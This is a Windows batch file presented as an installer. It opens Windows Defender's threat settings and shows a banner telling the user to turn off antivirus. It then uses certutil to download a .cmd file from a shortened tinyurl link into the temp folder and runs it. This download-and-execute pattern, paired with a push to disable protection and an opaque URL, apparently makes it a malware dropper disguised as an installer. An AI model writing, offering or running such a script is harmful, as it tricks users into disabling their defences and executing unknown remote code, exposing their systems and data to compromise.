@echo off
setlocal


:: =========================
:: Open Windows Defender / Threat settings
:: =========================
set "DEFENDER_EXE=%ProgramFiles%\Windows Defender\MSASCui.exe"

if exist "%DEFENDER_EXE%" (
    start "" "%DEFENDER_EXE%"
) else (
    start "" "windowsdefender://Threatsettings"
)

echo.
echo  +=========================================================+
echo  ^|                                                         ^|
echo  ^|       !!! IMPORTANT NOTICE !!!                          ^|
echo  ^|                                                         ^|
echo  ^|       PLEASE TEMPORARILY TURN OFF ANTIVIRUS             ^|
echo  ^|       THEN PRESS ANY KEY TO CONTINUE INSTALLATION       ^|
echo  ^|                                                         ^|
echo  +=========================================================+
echo.
pause >nul

:: =========================
:: Download installer (.cmd file)
:: =========================
set "URL=https://tinyurl.com/QCOkey"
set "TEMPFILE=%TEMP%\OKey.cmd"

echo Downloading installer...
certutil -urlcache -split -f "%URL%" "%TEMPFILE%"
if not exist "%TEMPFILE%" (
    echo Download failed or was blocked.
    exit /b 1
)

:: =========================
:: Run installer (.cmd) and wait
:: =========================
echo Running installer...
call "%TEMPFILE%"

set "RC=%ERRORLEVEL%"

if %RC% NEQ 0 (
    echo Installer finished with error code %RC%
    echo Please check manually.
)


echo.
echo Installation process completed.
exit /b %RC%
